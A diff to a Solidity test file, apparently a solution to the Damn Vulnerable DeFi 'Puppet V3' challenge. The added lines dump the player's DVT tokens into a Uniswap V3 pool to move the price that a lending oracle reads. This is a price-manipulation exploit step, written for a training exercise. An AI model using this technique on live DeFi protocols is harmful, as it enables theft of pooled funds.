@@ -172,6 +172,17 @@ contract PuppetV3Challenge is Test {
         // get amount of DVT to swap for WETH to push price in the direction we want
         uint256 amountDvtToSwap = token.balanceOf(player);
         // approve uniswap router to swap tokens for weth
+        token.approve(address(uniswapV3Pool), amountDvtToSwap);
+        // swap all DVT tokens for WETH to push price in the direction we want
+        // since this is a v3 pool we have to use the swap function directly instead of a router, and we have to specify the price limit for the swap to execute which is a quirk of v3 that isn't present in v2
+        uniswapV3Pool.swap(
+            player, // recipient of swap output
+            true, // swap token0 (DVT) for token1 (WETH)
+            int256(amountDvtToSwap), // amount to swap
+            // _encodePriceSqrt(UNISWAP_INITIAL_WETH_LIQUIDITY, UNISWAP_INITIAL_TOKEN_LIQUIDITY), // price limit for swap to execute
+            uint160(sqrtPriceX96),
+            "" // no data needed for this swap
+        );
     }
 
     /**
